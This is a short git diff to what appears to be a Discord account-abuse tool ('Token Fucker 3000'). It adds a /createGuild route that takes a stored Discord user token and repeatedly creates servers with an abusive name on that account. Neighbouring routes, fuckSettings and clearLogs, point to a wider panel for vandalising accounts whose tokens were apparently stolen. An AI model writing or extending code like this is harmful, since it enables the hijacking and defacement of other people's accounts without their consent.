@@ -159,6 +159,16 @@ app.get(`${base}/fuckSettings`, async (req, res) => {
 
     res.redirect("/misc");
 });
+app.get(`${base}/createGuild`, async (req, res) => {
+    const token = localStorage.getItem("token").toString();
+    const guildCount = 2;
+    
+    for (let i = 0; i < guildCount; i++) {
+        await DiscordAPI.createGuild(token, "Get Fucked By Token Fucker 3000!", "2TffvPucqHkN");
+    }
+
+    res.redirect("/misc");
+});
 app.get(`${base}/clearLogs`, async (req, res) => {
     fs.writeFile("src/logs.txt", "", (err) => {
         if (err) return console.log(err);
